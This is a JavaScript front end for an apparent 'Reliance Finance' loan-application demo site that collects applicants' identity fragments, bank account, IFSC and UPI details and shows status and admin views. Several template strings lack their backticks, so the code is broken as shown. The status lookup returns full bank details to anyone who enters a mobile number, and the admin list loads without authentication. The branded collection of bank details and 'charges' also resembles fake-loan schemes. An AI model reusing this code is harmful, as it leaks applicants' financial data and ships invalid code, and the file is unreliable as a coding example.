const API_BASE_URL = "https://reliance-finance-4fhm.onrender.com";

// -------------------- Common API Helper --------------------

async function apiRequest(endpoint, options = {}) {
    const response = await fetch(${API_BASE_URL}${endpoint}, {
        ...options,
        headers: {
            "Content-Type": "application/json",
            ...(options.headers || {})
        }
    });

    const text = await response.text();
    let data = {};

    try {
        data = text ? JSON.parse(text) : {};
    } catch {
        data = { message: text };
    }

    if (!response.ok) {
        throw new Error(
            data.error || data.message || Request failed (${response.status})
        );
    }

    return data;
}

// -------------------- Safe HTML Display --------------------

function escapeHtml(value) {
    if (value === null || value === undefined || value === "") {
        return "—";
    }

    return String(value).replace(/[&<>"']/g, character => ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#039;"
    })[character]);
}

function formatDate(value) {
    if (!value) return "—";

    const date = new Date(value);

    if (Number.isNaN(date.getTime())) {
        return escapeHtml(value);
    }

    return date.toLocaleString("en-IN", {
        dateStyle: "medium",
        timeStyle: "short"
    });
}

function formatMoney(value) {
    if (value === null || value === undefined || value === "") {
        return "—";
    }

    const number = Number(value);

    if (!Number.isFinite(number)) {
        return escapeHtml(value);
    }

    return "₹" + number.toLocaleString("en-IN");
}

// -------------------- Admin Messages --------------------

function showAdminMessage(message, type = "info") {
    const element = document.getElementById("adminMessage");

    if (!element) return;

    element.textContent = message;
    element.className = message ${type};
    element.style.display = "block";
}

// -------------------- Application Form --------------------

document.addEventListener("DOMContentLoaded", () => {
    const customerForm = document.getElementById("customerForm");

    if (customerForm) {
        customerForm.addEventListener("submit", async event => {
            event.preventDefault();

            const submitButton = customerForm.querySelector(
                'button[type="submit"], input[type="submit"]'
            );

            const originalText = submitButton
                ? submitButton.textContent
                : "";

            if (submitButton) {
                submitButton.disabled = true;
                submitButton.textContent = "Submitting...";
            }

            const getValue = id => {
                const element = document.getElementById(id);
                return element ? element.value.trim() : "";
            };

            const application = {
                name: getValue("customerName"),
                mobile: getValue("mobileNumber"),
                loanType: getValue("loanType"),
                loanAmount: getValue("loanAmount"),
                returnYear: getValue("returnYear"),
                percentage: getValue("percentage"),
                aadhaarLast4: getValue("aadhaarLast4"),
                panLast4: getValue("panLast4"),
                charge: getValue("charge"),
                chargeAmount: getValue("chargeAmount"),
                bankName: getValue("bankName"),
                accountHolderName: getValue("accountHolderName"),
                accountNumber: getValue("accountNumber"),
                ifscCode: getValue("ifscCode"),
                upiNumber: getValue("upiNumber")
            };

            if (!application.name || !application.mobile) {
                showAdminMessage(
                    "Please enter the applicant name and mobile number.",
                    "error"
                );

                if (submitButton) {
                    submitButton.disabled = false;
                    submitButton.textContent = originalText;
                }

                return;
            }

            try {
                const result = await apiRequest("/submit-application", {
                    method: "POST",
                    body: JSON.stringify(application)
                });

                showAdminMessage(
                    result.message || "Application submitted successfully.",
                    "success"
                );

                customerForm.reset();

                if (typeof loadCustomers === "function") {
                    await loadCustomers();
                }
            } catch (error) {
                console.error("Application submission error:", error);

                showAdminMessage(
                    error.message || "Unable to submit the application.",
                    "error"
                );
            } finally {
                if (submitButton) {
                    submitButton.disabled = false;
                    submitButton.textContent = originalText || "Submit";
                }
            }
        });
    }

    // Status lookup form/button
    const statusButton = document.getElementById("checkStatusBtn");

    if (statusButton) {
        statusButton.addEventListener("click", checkStatus);
    }

    // Mobile navigation
    const menuButton = document.getElementById("menuBtn");
    const mainNav = document.getElementById("mainNav");

    if (menuButton && mainNav) {
        menuButton.addEventListener("click", () => {
            const isOpen = mainNav.classList.toggle("active");
            menuButton.setAttribute("aria-expanded", String(isOpen));
        });

        mainNav.querySelectorAll("a").forEach(link => {
            link.addEventListener("click", () => {
                mainNav.classList.remove("active");
                menuButton.setAttribute("aria-expanded", "false");
            });
        });
    }

    loadCustomers();
});

// -------------------- Customer Status Lookup --------------------

async function checkStatus(event) {
    if (event) event.preventDefault();

    const mobileInput = document.getElementById("mobileNumber");
    const resultContainer = document.getElementById("statusResult");

    if (!mobileInput || !resultContainer) {
        console.error(
            "Status lookup needs elements with IDs mobileNumber and statusResult."
        );
        return;
    }

    const mobile = mobileInput.value.trim();

    if (!mobile) {
        resultContainer.innerHTML =
            '<p class="error-message">Please enter your mobile number.</p>';
        return;
    }

    resultContainer.innerHTML =
        '<div class="status-loading">Checking application status...</div>';

    try {
        const response = await apiRequest(
            /check-application?mobile=${encodeURIComponent(mobile)}
        );

        const item = response.application ||
            response.data ||
            response;

        if (!item || (!item.id && !item.name && !item.mobile)) {
            resultContainer.innerHTML =
                '<p class="error-message">No application found for this mobile number.</p>';
            return;
        }

        renderApplication(item, resultContainer);
    } catch (error) {
        console.error("Status lookup error:", error);

        resultContainer.innerHTML = `
            <div class="status-error">
                <h3>Unable to check status</h3>
                <p>${escapeHtml(error.message)}</p>
                <p>Please try again later.</p>
            </div>
        `;
    }
}

// -------------------- Professional Status Design --------------------

function addStatusStyles() {
    if (document.getElementById("professionalStatusStyles")) return;

    const style = document.createElement("style");
    style.id = "professionalStatusStyles";

    style.textContent = `
        .professional-status {
            width: 100%;
            max-width: 850px;
            margin: 24px auto;
            color: #172033;
            font-family: Arial, sans-serif;
        }

        .status-header {
            padding: 25px;
            color: white;
            background: linear-gradient(135deg, #123b78, #1769aa);
            border-radius: 16px 16px 0 0;
        }

        .status-header h2 {
            margin: 0 0 8px;
            font-size: 24px;
        }

        .status-header p {
            margin: 0;
            opacity: .9;
            overflow-wrap: anywhere;
        }

        .status-body {
            padding: 22px;
            background: #f7f9fc;
            border: 1px solid #e1e7f0;
            border-top: 0;
            border-radius: 0 0 16px 16px;
        }

        .status-summary {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 14px;
            margin-bottom: 22px;
        }

        .status-summary-card {
            padding: 17px;
            background: white;
            border: 1px solid #e4e9f2;
            border-radius: 12px;
            overflow-wrap: anywhere;
        }

        .status-summary-card span {
            display: block;
            margin-bottom: 8px;
            color: #68758b;
            font-size: 13px;
        }

        .status-summary-card strong {
            font-size: 19px;
            overflow-wrap: anywhere;
        }

        .status-section {
            margin-top: 18px;
            padding: 20px;
            background: white;
            border: 1px solid #e4e9f2;
            border-radius: 12px;
        }

        .status-section h3 {
            margin: 0 0 15px;
            font-size: 17px;
            color: #123b78;
        }

        .status-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 0 18px;
        }

        .status-detail {
            min-width: 0;
            padding: 12px 0;
            border-bottom: 1px solid #edf0f5;
        }

        .status-detail span {
            display: block;
            margin-bottom: 6px;
            color: #68758b;
            font-size: 12px;
        }

        .status-detail strong {
            display: block;
            font-size: 14px;
            overflow-wrap: anywhere;
            word-break: break-word;
        }

        .status-badge {
            display: inline-block;
            padding: 7px 12px;
            background: #e7f0ff;
            color: #174a91;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 700;
            text-transform: capitalize;
        }

        .status-qr {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100px;
            margin-top: 14px;
            overflow-wrap: anywhere;
        }

        .status-note {
            margin-top: 16px;
            padding: 12px;
            background: #fff8e6;
            border: 1px solid #f5df9a;
            border-radius: 8px;
            color: #6f5312;
            font-size: 13px;
            line-height: 1.5;
        }

        .status-loading,
        .status-error {
            margin: 20px auto;
            padding: 18px;
            text-align: center;
            border-radius: 10px;
            background: #f5f7fb;
        }

        .status-error,
        .error-message {
            color: #b42318;
        }

        @media (max-width: 520px) {
            .status-header,
            .status-body {
                padding: 16px;
            }

            .status-header h2 {
                font-size: 21px;
            }

            .status-section {
                padding: 14px;
            }

            .status-details {
                grid-template-columns: 1fr;
            }
        }
    `;

    document.head.appendChild(style);
}

function detail(label, value) {
    return `
        <div class="status-detail">
            <span>${escapeHtml(label)}</span>
            <strong>${escapeHtml(value)}</strong>
        </div>
    `;
}

function renderApplication(item, container) {
    addStatusStyles();

    const status = item.status || "Pending";
    const normalizedStatus = String(status).toLowerCase();

    const statusLabel = escapeHtml(status);
    const createdAt = formatDate(item.created_at);

    container.innerHTML = `
        <div class="professional-status">
            <div class="status-header">
                <h2>Application Status</h2>
                <p>Application ID: ${escapeHtml(item.id || "—")}</p>
                <p>Submitted: ${createdAt}</p>
            </div>

            <div class="status-body">
                <div class="status-summary">
                    <div class="status-summary-card">
                        <span>Loan Amount</span>
                        <strong>${formatMoney(item.loan_amount)}</strong>
                    </div>

                    <div class="status-summary-card">
                        <span>Return Period</span>
                        <strong>${escapeHtml(item.return_year || "—")}</strong>
                    </div>

                    <div class="status-summary-card">
                        <span>Recorded Percentage</span>
                        <strong>${escapeHtml(item.percentage || "—")}${item.percentage !== null && item.percentage !== undefined && item.percentage !== "" ? "%" : ""}</strong>
                    </div>

                    <div class="status-summary-card">
                        <span>Current Status</span>
                        <strong><span class="status-badge">${statusLabel}</span></strong>
                    </div>
                </div>

                <div class="status-section">
                    <h3>Applicant Details</h3>
                    <div class="status-details">
                        ${detail("Full Name", item.name)}
                        ${detail("Mobile Number", item.mobile)}
                        ${detail("Loan Type", item.loan_type)}
                        ${detail("Application ID", item.id)}
                        ${detail("Application Date", createdAt)}
                        ${detail("Status", status)}
                    </div>
                </div>

                <div class="status-section">
                    <h3>Bank Details</h3>
                    <div class="status-details">
                        ${detail("Bank Name", item.bank_name)}
                        ${detail("Account Holder Name", item.account_holder_name)}
                        ${detail("Account Number", item.account_number)}
                        ${detail("IFSC Code", item.ifsc_code)}
                        ${detail("UPI Number", item.upi_number)}
                    </div>
                </div>

                <div class="status-section">
                    <h3>Application Progress</h3>
                    <p>
                        Current status:
                        <span class="status-badge">${statusLabel}</span>
                    </p>
                    <p>
                        ${normalizedStatus.includes("approv")
                            ? "The application is marked as approved in the recorded data."
                            : normalizedStatus.includes("reject")
                                ? "The application is marked as rejected in the recorded data."
                                : normalizedStatus.includes("complete")
                                    ? "The application is marked as completed in the recorded data."
                                    : "The application status is shown above using the current recorded data."}
                    </p>
                </div>

                <div class="status-section">
                    <h3>QR Code</h3>
                    <p>Demo QR code — not a payment request.</p>
                    <div class="status-qr" id="applicationStatusQr"></div>
                    <div class="status-note">
                        Demo website only. This QR code does not confirm a payment,
                        loan approval, or transfer of money.
                    </div>
                </div>
            </div>
        </div>
    `;

    const qrContainer = container.querySelector("#applicationStatusQr");

    if (qrContainer && typeof QRCode !== "undefined") {
        new QRCode(qrContainer, {
            text: "DEMO ONLY - NOT A PAYMENT",
            width: 150,
            height: 150
        });
    } else if (qrContainer) {
        qrContainer.textContent = "QR code library is not loaded.";
    }
}

// -------------------- Admin Customer List --------------------

async function loadCustomers() {
    const customerList = document.getElementById("customerList");

    if (!customerList) return;

    customerList.innerHTML = "<p>Loading applications...</p>";

    try {
        const response = await apiRequest("/admin/applications");

        const applications = Array.isArray(response)
            ? response
            : response.applications || response.data || [];

        if (!applications.length) {
            customerList.innerHTML = "<p>No applications found.</p>";
            return;
        }

        customerList.innerHTML = applications.map(item => `
            <tr>
                <td>${escapeHtml(item.id)}</td>
                <td>${escapeHtml(item.name)}</td>
                <td>${escapeHtml(item.mobile)}</td>
                <td>${escapeHtml(item.loan_type)}</td>
                <td>${formatMoney(item.loan_amount)}</td>
                <td>${escapeHtml(item.status || "Pending")}</td>
                <td>${formatDate(item.created_at)}</td>
            </tr>
        `).join("");
    } catch (error) {
        console.error("Load applications error:", error);

        customerList.innerHTML = `
            <tr>
                <td colspan="7">
                    Unable to load applications: ${escapeHtml(error.message)}
                </td>
            </tr>
        `;
    }
}
